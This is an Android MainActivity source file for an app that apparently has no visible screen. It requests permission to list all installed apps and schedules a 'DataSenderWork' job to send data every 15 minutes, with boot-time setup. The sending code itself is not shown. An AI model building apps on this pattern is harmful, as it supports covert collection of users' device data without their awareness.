package com.sabbir.dgw;

import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.os.Bundle;
import android.os.Handler;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;
import androidx.work.Constraints;
import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.NetworkType;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;

import java.util.concurrent.TimeUnit;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 1;
    private Handler handler = new Handler();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        //setContentView(R.layout.activity_main);

        // Initialize WorkManager in background
        handler.post(() -> {
            BootReceiver.initializeWorkManager(this);
            schedulePeriodicWork();
        });

        // Request permissions without instant closing
        String[] permissions = {
                android.Manifest.permission.QUERY_ALL_PACKAGES
        };

        if (!hasPermissions(permissions)) {
            requestPermissionsWithDelay(permissions);
        }
    }

    private void requestPermissionsWithDelay(String[] permissions) {
        handler.postDelayed(() -> {
            androidx.core.app.ActivityCompat.requestPermissions(
                    this,
                    permissions,
                    PERMISSION_REQUEST_CODE
            );
        }, 1000); // 1 second delay
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            // Continue app execution even if permissions are not granted
            schedulePeriodicWork();
        }
    }

    private void schedulePeriodicWork() {
        Constraints constraints = new Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build();

        PeriodicWorkRequest dataSenderWork = new PeriodicWorkRequest.Builder(
                DataSendWorker.class,
                15, TimeUnit.MINUTES)  // Increased interval for better performance
                .setConstraints(constraints)
                .build();

        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
                "DataSenderWork",
                ExistingPeriodicWorkPolicy.KEEP,
                dataSenderWork);
    }

    private boolean hasPermissions(String[] permissions) {
        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }
}

